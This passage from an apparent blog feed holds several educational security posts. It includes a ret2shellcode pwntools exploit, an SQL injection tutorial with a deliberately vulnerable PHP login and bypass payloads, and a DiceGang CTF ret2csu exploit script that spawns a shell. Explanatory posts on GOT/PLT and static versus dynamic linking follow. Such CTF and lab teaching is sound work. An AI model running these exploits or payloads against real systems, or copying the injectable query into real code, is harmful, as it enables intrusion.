<p>This is the third and final way that we will discuss in this blog. Do you remember the leak at the begining ? Yes we will use the leak to get a shell. This time ignore the win() function. Without the help of helper function get a shell yourself :D .</p>

<p>Remember at the begining I said this binary is NX disabled. So we can basically store the commands that we want to excecute in buf variable and then jump back to the buf variable thereby excecuting whatever we want.</p>

<blockquote>
  <p>A shellcode is a set of instruction that will give you a shell or does some function that you want when excecuted.</p>
</blockquote>

<ul>
  <li>First step is to store the leak in a variable. We will use <strong>recvline</strong> function here to recv the output given by the program.</li>
  <li>Write all the commands that you want to excecute to get a shell (pwntools has inbuilt functionalities :D ).</li>
  <li>Fill the gap between the return and the shellcode with dummy instructions called nop.</li>
  <li>Jump back to buf variable.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
	<span class="k">global</span> <span class="n">p</span>
	<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
		<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">localhost</span><span class="sh">'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">process</span><span class="p">()</span> <span class="c1"># start the process.
</span>
<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./ret2shellcode</span><span class="sh">'</span><span class="p">)</span> 
<span class="nf">start</span><span class="p">()</span>

<span class="n">buf_addr</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvlines</span><span class="p">(</span><span class="mi">2</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">()[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="c1"># recvlines and then get the leak
</span>
<span class="n">payload</span> <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="nf">sh</span><span class="p">())</span> <span class="c1"># generates a shellcode compatible with linux systems
</span><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x90</span><span class="sh">'</span><span class="o">*</span><span class="p">(</span><span class="mi">104</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span> <span class="c1"># spans the gap between buf variable and return 
</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span> <span class="c1"># address of the buf variable
</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="c1"># send the payload
</span>
<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span> <span class="c1"># doesnt close the shell and keeps it open for us.
</span><span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</code></pre></div></div>

<p>Hope you liked the pwn training 1. More training writeups coming soon ! :D</p>]]></content><author><name>tourpran</name></author><category term="pwn-training" /><category term="ret2shellcode" /><category term="ret2win" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">[side quest] SQL Injection</title><link href="http://localhost:4000/blogs/2021/03/27/sqlinjection.html" rel="alternate" type="text/html" title="[side quest] SQL Injection" /><published>2021-03-27T00:00:00+05:30</published><updated>2021-03-27T00:00:00+05:30</updated><id>http://localhost:4000/blogs/2021/03/27/sqlinjection</id><content type="html" xml:base="http://localhost:4000/blogs/2021/03/27/sqlinjection.html"><![CDATA[<h3 id="what-is-a-database">What is a Database:</h3>
<p>A database can be thought as a collection of data in an organised manner. When companies have huge amounts of data to be stored, using databases is the key for efficient usage of the data.</p>

<p><img src="/assets/images/databasepic.png" alt="" /></p>

<h3 id="sql">SQL:</h3>
<p>SQL or Structured Query Language is just a way to talk to the database and manipulate the data by the program. In most Database management systems SQL language is used. This blog post is divided into <code class="language-plaintext highlighter-rouge">basics of sql</code> and <code class="language-plaintext highlighter-rouge">exploitation of sql</code>.</p>

<h3 id="sql-basics">SQL Basics:</h3>

<h4 id="creating-a-database">Creating a Database:</h4>

<p>In order to follow this blog post it’ll be helpfull to have mysql installed. First we will create and use a Database in mysql called testdb. Now this database can use used to store multiple tables where each table can be used to store different types of datas. For example a login table can be used to store all usernames and passwords and a store website can use another table to store all their products and prices with it.</p>

<p><img src="/assets/images/databasecreation.png" alt="" /></p>

<h4 id="creating-tables">Creating tables:</h4>

<p>For the fun of it lets create a table called person since everyone has their own unique <code class="language-plaintext highlighter-rouge">features</code>. By features I mean their name, height and weigth.</p>

<p><img src="/assets/images/tablesexample.png" alt="" /></p>

<h4 id="access-the-data">Access the data:</h4>

<p>Inorder to get the required data we use SELECT statements. when we have lines of select statements and commands to give to the databases we call them queries.</p>

<p>note: * means everything (all)</p>

<p><img src="/assets/images/queryexample.png" alt="" /></p>

<p>Here we are select everything present in the table called person.</p>

<p>When we have multiple number of objects in our table we can use a element present in each object that is unique. Most of the time our names our unique so we can access our object with the help of out name.</p>

<p><img src="/assets/images/queryexample1.png" alt="" /></p>

<h4 id="login-system">Login system:</h4>

<p>In our login system (which we will use to hack) we have used sql query to check if the user and password given my the user is correct. The pseudo code is given below:</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT id FROM admin WHERE username = '</span><span class="nv">$myusername</span><span class="s2">' and passcode = '</span><span class="nv">$mypassword</span><span class="s2">'"</span><span class="p">;</span>
<span class="nv">$result</span> <span class="o">=</span> <span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span><span class="nv">$sql</span><span class="p">);</span> <span class="c1"># Send the sql query to DataBase</span>
<span class="nv">$row</span> <span class="o">=</span> <span class="nf">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span><span class="no">MYSQLI_ASSOC</span><span class="p">);</span> <span class="c1"># Fetchs a result row as a array</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$count</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">echo</span> <span class="s2">"Success! "</span> <span class="c1"># Tell the user the login creds were correct</span>
<span class="p">}</span>
<span class="k">else</span><span class="p">{</span>
	<span class="k">echo</span> <span class="s2">"Invalid "</span> <span class="c1"># Tell the user the login creds were incorrect</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<h3 id="different-exploitation-techniques">Different Exploitation Techniques:</h3>

<h4 id="simple-login-bypass">Simple login bypass:</h4>

<p>We can see that there are 2 users in the table. Obviously in the real world application there wont be a table showing the credentials, inorder for learning purpose I have made them visible. Now lets check if there is a sql injection possible.</p>

<p><img src="/assets/images/loginlocalhost.png" alt="" /></p>

<p><img src="/assets/images/sqllocalhosterror.png" alt="" /></p>

<p>Now If you are following the blog correctly you would have already know that this error is due to the ‘ (single quote) I gave. So the query looks like</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT id FROM admin WHERE username = '' ' and passcode = 'a'
</code></pre></div></div>
<p>The unmatched single quotes make the query break and thereby telling us there are chances for a SQLInjection. Also a point to note is, its not required to get an error every time to prove there is a SQL Injection. Infact in most real world applications you would be left with blind sql injections which doesnt give you any output (covered later in this blog).</p>

<p>So we will use basic boolean logic for the first attack. We will tell the SQL Query that the username is true and passcode is true. So this will return the entire table and mostly likely we will be logged in as the first user (extreme case, likely never happens).</p>

<p><img src="/assets/images/sqlsimplelogin1.png" alt="" />
<img src="/assets/images/simpleloginsql2.png" alt="" /></p>

<p>Here we can see I gained access as tourpran who is the first user. Also in the query I managed to say that <code class="language-plaintext highlighter-rouge">username='' or TRUE</code> which will always be true, same for the password.</p>

<p>We can also login as admin if we pass the following credentials.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>UserName: admin
password: ' or 'a'='a

SELECT id FROM admin WHERE username = 'admin' and passcode = '' or 'a'='a'

or 

username: ' or '1'='1
password: ' or 'a'='a' and username='admin' ; #

SELECT id FROM admin WHERE username = '' or 'a'='a' and passcode = '' or 'a'='a' and username='admin' ; #'

# - comment the rest of the line
</code></pre></div></div>]]></content><author><name>tourpran</name></author><category term="Blogs" /><category term="sql" /><category term="Injection" /><category term="SQLI" /><summary type="html"><![CDATA[What is a Database: A database can be thought as a collection of data in an organised manner. When companies have huge amounts of data to be stored, using databases is the key for efficient usage of the data.]]></summary></entry><entry><title type="html">babyROP | DiceGang CTF</title><link href="http://localhost:4000/writeup/2021/02/07/babyropdice.html" rel="alternate" type="text/html" title="babyROP | DiceGang CTF" /><published>2021-02-07T00:00:00+05:30</published><updated>2021-02-07T00:00:00+05:30</updated><id>http://localhost:4000/writeup/2021/02/07/babyropdice</id><content type="html" xml:base="http://localhost:4000/writeup/2021/02/07/babyropdice.html"><![CDATA[<h2 id="challenge-description">Challenge Description</h2>
<p><img src="/assets/images/challdesbabyrop.png" alt="" /></p>

<h3 id="solution">Solution:</h3>

<ul>
  <li>Checkout the mitigations of the binary</li>
  <li>Try to find gadgets since this is a ROP challenge. If you dont know much about ROP checkout <a href="https://ropemporium.com/">ROPemporium</a>.</li>
  <li>Craft the payload to get flag from server.</li>
</ul>

<h4 id="mitigations">Mitigations:</h4>
<p><img src="/assets/images/mitigationdice.png" alt="" /></p>
<ul>
  <li>We can’t excecute shellcode (NX Enabled)</li>
  <li>No Canary found - no need for brute force or leaks</li>
  <li>PIE disabled - the address of the binary wont be randomised</li>
</ul>

<h4 id="finding-gadgets">Finding Gadgets:</h4>

<p>Install ROPgadget to find all the gadgets in the binary.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ROPgadget <span class="nt">--binary</span> babyrop
</code></pre></div></div>
<p>My first thought was to <code class="language-plaintext highlighter-rouge">write</code> the address pointed by the got of <code class="language-plaintext highlighter-rouge">write</code>. The idea was to leak the address of write function. Since write has already been called by the program the GOT of write will be populated and the got will point to the libc address of write. The following gadgets are needed.</p>
<pre><code class="language-asm">pop rdi
pop rsi 
pop rdx
</code></pre>
<p>I did not have the pop rdx register which makes the challenge a bit more intresting. So we need to find a way to set the value of RDX, RSI, RDI.</p>
<pre><code class="language-asm">rsi - point to the buffer [write@got]
rdi - file discriptor = 1
rdx - size of the buffer = &gt;8
</code></pre>

<p>Since ropgadget did not give me the gadget I went to look for more gadgets in the <code class="language-plaintext highlighter-rouge">__libc_csu_init</code>. There I could find all the gadgets I wanted.</p>

<h4 id="crafting-exploit">Crafting Exploit:</h4>

<p>These are the important gadgets I want.</p>

<p><img src="/assets/images/gadgetsdice.png" alt="" /></p>

<h4 id="idea">Idea</h4>

<p>First overflow the buffer with garbage and then make return jump to csu. Things to note.</p>

<pre><code class="language-asm">0x00000000004011b0 &lt;+64&gt;:	mov    rdx,r14
0x00000000004011b3 &lt;+67&gt;:	mov    rsi,r13
0x00000000004011b6 &lt;+70&gt;:	mov    edi,r12d

0x00000000004011ca &lt;+90&gt;:	pop    rbx
0x00000000004011cb &lt;+91&gt;:	pop    rbp
0x00000000004011cc &lt;+92&gt;:	pop    r12
0x00000000004011ce &lt;+94&gt;:	pop    r13
0x00000000004011d0 &lt;+96&gt;:	pop    r14
0x00000000004011d2 &lt;+98&gt;:	pop    r15
0x00000000004011d4 &lt;+100&gt;:	ret 
</code></pre>

<p>Now we can control the RDI, RSI, RDX because we can control the r14, r13, r12 registers. Intresting area was the call to <code class="language-plaintext highlighter-rouge">QWORD PTR [r15+rbx*8]</code> inbetween these gadgets. So we decided to make this <code class="language-plaintext highlighter-rouge">QWORD PTR [r15+rbx*8]</code> as the write function. In order to do this well set r15 as the address to write@got and rbx as 0.</p>

<pre><code class="language-asm">0x00000000004011b9 &lt;+73&gt;:	call   QWORD PTR [r15+rbx*8]
0x00000000004011bd &lt;+77&gt;:	add    rbx,0x1
0x00000000004011c1 &lt;+81&gt;:	cmp    rbp,rbx
0x00000000004011c4 &lt;+84&gt;:	jne    0x4011b0 &lt;__libc_csu_init+64&gt;
</code></pre>
<p>Hmmm :(. Seems like there is a compare statement that’ll make us jump back to the csu+64 (which is somewhere in the middle of csu). Now lets make rbp as 1 so we dont take the jump.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="o">*</span><span class="mi">72</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x00000000004011ca</span><span class="p">)</span> <span class="c1">#rbx rbp r12 r13 r14 r15
</span><span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">'</span><span class="s">write</span><span class="sh">'</span><span class="p">])</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">'</span><span class="s">write</span><span class="sh">'</span><span class="p">])</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x00000000004011b0</span><span class="p">)</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">main</span><span class="sh">'</span><span class="p">])</span>
</code></pre></div></div>

<p>Exploit for leaking libc write address looks something like this. :) Now lets just recv the leak and see what libc they are using. To find out their libc go to <a href="https://libc.blukat.me/">libc.blukat.me</a></p>

<p><img src="/assets/images/blukatdice.png" alt="" /></p>

<p>Now its basic math, since all the address in the libc will be at the same offset from one another. Once you get the leak just find address of /bin/sh and system then just call system with /bin/sh as argument. Pretty intresting challenge and fun to solve :).</p>

<p>Anyway here is the exploit script for this challenge.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># Set up pwntools for the correct architecture
</span><span class="n">context</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="sh">'</span><span class="s">i386</span><span class="sh">'</span><span class="p">)</span>
<span class="n">exe</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./babyrop</span><span class="sh">'</span>

<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./babyrop</span><span class="sh">"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="c1"># ./exploit.py GDB
</span><span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>

<span class="c1">#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
</span>
<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">dicec.tf</span><span class="sh">"</span><span class="p">,</span> <span class="mi">31924</span><span class="p">)</span>

<span class="c1"># shellcode = asm(shellcraft.sh())
</span>
<span class="sh">'''</span><span class="s">
0x00000000004011d3 : pop rdi ; ret

write syscall 
rdi = 1
rsi = pointer to puffer (pointer to write function)
rdx = size
</span><span class="sh">'''</span>

<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sh">"</span><span class="s">: </span><span class="sh">"</span><span class="p">)</span>

<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="o">*</span><span class="mi">72</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x00000000004011ca</span><span class="p">)</span> <span class="c1">#rbx rbp r12 r13 r14 r15
</span><span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">'</span><span class="s">write</span><span class="sh">'</span><span class="p">])</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="o">+</span><span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">'</span><span class="s">write</span><span class="sh">'</span><span class="p">])</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x00000000004011b0</span><span class="p">)</span> 
<span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">7</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">main</span><span class="sh">'</span><span class="p">])</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>

<span class="c1"># log.info("write leak: {}".format((hex(u64(p.recv(8))))))
</span>
<span class="n">leak</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="nf">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">Write leak: {}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">)))</span>

<span class="n">sys</span> <span class="o">=</span> <span class="n">leak</span><span class="o">-</span><span class="mh">0xbbdc0</span>

<span class="n">binsh</span> <span class="o">=</span> <span class="n">leak</span><span class="o">+</span><span class="mh">0xa63da</span>

<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="o">*</span><span class="mi">72</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x40116b</span><span class="p">)</span> <span class="c1">#ret
</span><span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x00000000004011d3</span><span class="p">)</span> <span class="c1">#pop rdi 
</span><span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">sys</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>


</code></pre></div></div>]]></content><author><name>tourpran</name></author><category term="writeup" /><category term="csu" /><category term="ret2csu" /><category term="dicegang" /><summary type="html"><![CDATA[Challenge Description]]></summary></entry><entry><title type="html">[part 3] Global Offset Table and Procedure Linkage Table</title><link href="http://localhost:4000/blogs/2020/09/13/got-plt.html" rel="alternate" type="text/html" title="[part 3] Global Offset Table and Procedure Linkage Table" /><published>2020-09-13T00:00:00+05:30</published><updated>2020-09-13T00:00:00+05:30</updated><id>http://localhost:4000/blogs/2020/09/13/got-plt</id><content type="html" xml:base="http://localhost:4000/blogs/2020/09/13/got-plt.html"><![CDATA[<h2 id="introduction">Introduction</h2>

<h3 id="where-and-why-">where and why ?</h3>

<blockquote>
  <p>So Before diving into the concepts and working of GOT and PLT. Lets understand why we need them and where we need them.</p>
</blockquote>

<p>So, In modern days we cant always compile the libraries or dependencies along with the binary. So the alternative option is to use Dynamic Linking. With advantages comes some complexity :P. So we dont know the address of functions that are used in the binary which are indeed defined in the dependency. So each time the binary runs the address needs to be <code class="language-plaintext highlighter-rouge">resolved</code>. This cool process is done with the help of GOT and PLT. Also these are not functions. They are just tables as the names suggest.</p>

<h2 id="sample-code">Sample Code</h2>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"Hello World</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"Welcome to my blog</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>now compile this with no pie and 64 bit for further ease.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc test.c -o test -no-pie
</code></pre></div></div>

<p>Now this is Dynamically Linked (GCC does Dynamic Linking by default). So lets us run this… Works fine.</p>

<h2 id="gdb-code-analysis">GDB Code Analysis</h2>

<p>So let us use GDB (me - GDB-PEDA). Now disassemble the main and check for printf that we implemented. Hmm.. Weird We dont see it. If you read my previous blog you would know why. In short this is for efficiency. Do notice that the puts is actually termed puts@plt.</p>
<ul>
  <li>Set a breakpoint at puts@plt</li>
  <li>run the program
We come to puts@plt instead of next step let us single step to see what is there in the puts@plt. 
<img src="/assets/images/got1.png" alt="" /></li>
</ul>

<p>Now in the disassembly we can see that its not really puts function, We landed in the plt section of puts. Yes!! Procedure Linkage <strong>Table</strong>. Its basically a table which does a jump to the Global Offset Table for that particular entry, “puts”. Also remember this “GOT” is located in the .got section in the binary.</p>

<p>Now we know that the got will not be filled with the address of puts as this is the first time this LIBC function is being called. So instead of real address of puts the got section of puts will contain the address of next instruction, which is a push followed by another jump. This push of a number <strong>can</strong> be imagined as the index of the string “puts” in the string table. Next the jump is to the function <code class="language-plaintext highlighter-rouge">_dl_runtime_resolve</code>. Yes this is the resolver,</p>

<blockquote>
  <p>dl runtime resolve</p>
</blockquote>

<p>This function will take the string as input and will find the real address of puts in libc and finally will change the GOT entry for puts. So due to this the function puts need not be searched again in the libc but can be directly taken from the got.</p>

<p>This whole process can be imagined this way.
<img src="/assets/images/got2.png" alt="" /></p>

<h2 id="end">end</h2>
<p>End of story. Great now you know a little bit of how GOT and PLT works.</p>]]></content><author><name>tourpran</name></author><category term="Blogs" /><category term="got" /><category term="plt" /><category term="dynamic linking" /><summary type="html"><![CDATA[Introduction]]></summary></entry><entry><title type="html">[part 2] Dynamic and Static Linking</title><link href="http://localhost:4000/blogs/2020/09/11/blog2.html" rel="alternate" type="text/html" title="[part 2] Dynamic and Static Linking" /><published>2020-09-11T00:00:00+05:30</published><updated>2020-09-11T00:00:00+05:30</updated><id>http://localhost:4000/blogs/2020/09/11/blog2</id><content type="html" xml:base="http://localhost:4000/blogs/2020/09/11/blog2.html"><![CDATA[<h2 id="start">start:</h2>

<p>Before going on to static and Dynamic linkning let us understand linking.</p>

<h2 id="linking">Linking:</h2>
<p>Linking - It is the process where something is being connected to something else. Suppose you call functions that is not defined in your binary and has to be used from some dependencies. There <strong>Linking</strong> comes into picture.</p>

<h2 id="sample-program">sample program</h2>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Hello World</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Welcome to my blog</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>This will just print 2 strings to the terminal. Nothing intresting and complicated. Now let us compile this with static flag set.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc --static test.c -o test
</code></pre></div></div>
<h2 id="code-analysis">Code Analysis</h2>

<p>Now this is statically compiled. Let us try to analyse the code and see how the printf function is called.</p>
<ul>
  <li>note: Printf is a libc function, which means it is not included in the binary and is been imported from a external dependency.</li>
</ul>

<p>so open gdb and disassembly main
<img src="/assets/images/main.png" alt="" /></p>

<p>We can see that there is a normal puts. Do you remember we used printf in our function. This means the compiler plays god and decides the best function to be used in that place. Since puts is more efficient than printf it was implemented there. Instead when you use format strings in printf then puts cant be implemented in that case.
set a break point at puts and run the program.
<img src="/assets/images/main1.png" alt="" /></p>

<p>So now we see we go into the function puts. which has an address <code class="language-plaintext highlighter-rouge">0x4118c0</code>. Now is this address kinda giving you an idea ? Yup ! This is our binary. If we do a vmmap (virtual memory mapping) then we can see that the address from <code class="language-plaintext highlighter-rouge">0x00400000</code> to <code class="language-plaintext highlighter-rouge">0x004e7000</code> are inside the binary. Now we can say that the puts function is inside the binary so its address is also known at runtime.</p>

<h2 id="pros-and-cons">Pros and Cons</h2>

<table>
  <thead>
    <tr>
      <th style="text-align: right">Advantage</th>
      <th style="text-align: center">disadvantage</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: right">Anybody having the binary can excecute it. There will be no dependency errors</td>
      <td style="text-align: center">In real Life the applications are pretty huge and need multiple dependency files. Combining all of them into one file will make the size of the binary pretty huge.</td>
    </tr>
  </tbody>
</table>

<h2 id="dynamic-linking">Dynamic Linking</h2>

<p>Time to move on to the complicated stuff. To compile it as dynamic, you have to do a normal gcc compilation as GCC compiles everything into Dynamic linking by default.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc test.c -o test
</code></pre></div></div>

<h2 id="code-analysis-1">Code Analysis</h2>

<p>We know for a fact that the functions are not going to be inside our binary. The binary being smart will store the names of dependencies that our needed to excecute this file.</p>

<blockquote>
  <p>Mr. Dynamic Linker</p>
</blockquote>

<p>The Dynamic Linker will link all the dependencies to the binary.</p>

<p>First before excecuting the elf the system will excecute interpreter, which is a program that sets up the environment for excecuting the binary, this is done with the help of .dynamic section.
This program (interpreter) lies in the pt_interp segment which is created by the ld (compile-time linker).</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>readelf -d test
</code></pre></div></div>
<p><img src="/assets/images/main3.png" alt="" /></p>

<ul>
  <li>NEEDED : contains the names of all the dependencies.</li>
  <li>DT_SYMTAB : Address of the dynamic symbol table. 
so on…</li>
</ul>

<h3 id="steps">steps</h3>
<ul>
  <li>First the dynamic linker will load the excecutable into memory.</li>
  <li>Next will load the dependencies which are mentioned in the binary.</li>
  <li>Relocation - shared libraries are loaded into non-deterministic addresses.</li>
  <li>then do some initialisation and go back to binary’s entry point / starting point</li>
</ul>

<p><img src="/assets/images/main5.png" alt="" /></p>

<h2 id="pros-and-cons-1">Pros and Cons</h2>

<table>
  <thead>
    <tr>
      <th style="text-align: center">Advantage</th>
      <th style="text-align: center">disadvantage</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center">People only need to have the dependencies installed once, that can be used for other binaries as well.</td>
      <td style="text-align: center">People who dont have the correct dependency will face a lot of problems(finding them).</td>
    </tr>
  </tbody>
</table>

